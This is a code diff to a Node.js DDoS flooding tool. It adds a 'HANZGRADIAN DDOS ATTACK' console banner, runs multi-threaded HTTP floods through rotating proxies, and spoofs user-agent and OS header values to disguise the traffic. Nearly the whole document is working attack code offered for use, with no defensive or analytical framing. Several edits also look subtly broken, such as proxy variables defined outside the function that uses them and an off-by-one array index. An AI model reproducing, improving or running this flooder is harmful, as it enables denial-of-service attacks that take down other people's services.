@@ -215,6 +215,19 @@ const secureOptions =
 const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` HANZGRADIAN DDOS ATTACK`.red.bold);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` >> Target       : `.brightYellow + process.argv[2]);
+    console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
+    console.log(` >> Rate         : `.brightYellow + process.argv[4] + " req/s");
+    console.log(` >> Threads      : `.brightYellow + process.argv[5]);
+    console.log(` >> Proxy File   : `.brightYellow + process.argv[6]);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` [!] Attack launched successfully`.brightRed);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log("HANZGRADIAN DDOS | HIGH RQ/S GLORY CUSTOM".yellow.bold);
+    
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
@@ -244,7 +257,11 @@ if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-} else {runFlooder() }
+} else {
+    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
+    const parsedProxy = proxyAddr.split(":");
+    setInterval(runFlooder);
+}
 
 
  class NetSocket {
@@ -253,14 +270,14 @@ if (cluster.isMaster) {
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
      const connection = net.connect({
         host: options.host,
         port: options.port,
     });
 
-    connection.setTimeout(options.timeout * 1000);
+    connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 600000);
     connection.setNoDelay(true)
     connection.on("connect", () => {
@@ -312,7 +329,7 @@ return result;
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
  function randomElement(elements) {
-     return elements[randomIntn(0, elements.length - 1)];
+     return elements[randomIntn(0, elements.length)];
  }
  function randstrs(length) {
     const characters = "0123456789";
@@ -327,9 +344,6 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const workerId = cluster.worker.id;
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     const nm = [
       "110.0.0.0",
@@ -367,40 +381,60 @@ const randstrsValue = randstrs(10);
       "97.0.0.0",
       ];
       const sysos = [
-      "Windows 11",
-      "Windows 11 Pro",
-      "Windows 11 Enterprise",
-      "Windows 11 Education",
-      "Windows 10 version 22H2",
-      "Windows 10 version 21H2",
-      "Windows 10 version 21H1",
-      "Windows Server 2022",
-      "Windows Server 2019",
-      "Windows Server 2016",
+      "Windows 1.01",
+      "Windows 1.02",
+      "Windows 1.03",
+      "Windows 1.04",
+      "Windows 2.01",
+      "Windows 3.0",
+      "Windows NT 3.1",
+      "Windows NT 3.5",
+      "Windows 95",
+      "Windows 98",
+      "Windows 2006",
+      "Windows NT 4.0",
+      "Windows 95 Edition",
+      "Windows 98 Edition",
+      "Windows Me",
+      "Windows Business",
+      "Windows XP",
+      "Windows 7",
+      "Windows 8",
+      "Windows 10 version 1507",
+      "Windows 10 version 1511",
+      "Windows 10 version 1607",
+      "Windows 10 version 1703",
       ];
       const winarch = [
-      "x86-64",
-      "ARM64",
+      "x86-16",
+      "x86-16, IA32",
+      "IA-32",
+      "IA-32, Alpha, MIPS",
+      "IA-32, Alpha, MIPS, PowerPC",
+      "Itanium",
+      "x86_64",
+      "IA-32, x86-64",
+      "IA-32, x86-64, ARM64",
       "x86-64, ARM64",
-      "x86-64",
-      "ARM64",
-      "x86-64",
-      "ARM64",
-      "x86-64",
-      "ARM64",
-      "x86-64",
+      "ARMv4, MIPS, SH-3",
+      "ARMv4",
+      "ARMv5",
+      "ARMv7",
+      "IA-32, x86-64, Itanium",
+      "IA-32, x86-64, Itanium",
+      "x86-64, Itanium",
       ];
       const winch = [
-      "2022",
-      "2022 Datacenter",
-      "2019",
-      "2019 Datacenter",
-      "2016",
-      "2016 Datacenter",
-      "22H2",
-      "21H2",
-      "21H1",
-      "20H2",
+      "2012 R2",
+      "2019 R2",
+      "2012 R2 Datacenter",
+      "Server Blue",
+      "Longhorn Server",
+      "Whistler Server",
+      "Shell Release",
+      "Daytona",
+      "Razzle",
+      "HPC 2008",
       ];
       
        var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
@@ -421,10 +455,10 @@ const randstrsValue = randstrs(10);
          var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
          
   encoding_header = [
-    'gzip, deflate, br',
-    'compress, gzip',
-    'deflate, gzip',
-    'gzip, identity'
+    'gzip, deflate, br'
+    , 'compress, gzip'
+    , 'deflate, gzip'
+    , 'gzip, identity'
   ];
   function randstrr(length) {
 		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
@@ -488,20 +522,16 @@ let headers = {
   "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
   "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
   "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-  "user-agent" :  "Mozilla/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 " + nm4,
+  "user-agent" :  "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
 }
  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 5
+     timeout: 10
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
-    if (error) {
-      console.log(`Proxy ${proxyAddr} failed, selecting new proxy.`);
-      setImmediate(runFlooder);
-      return;
-    }
+    if (error) return
 
     connection.setKeepAlive(true, 600000);
     connection.setNoDelay(true)
@@ -603,7 +633,6 @@ connection.destroy();
 return
 });
 });
-console.log(`Proxy ${proxyAddr} connected to thread ${workerId} -> sent requests.`);
 }
 const StopScript = () => process.exit(1);
 
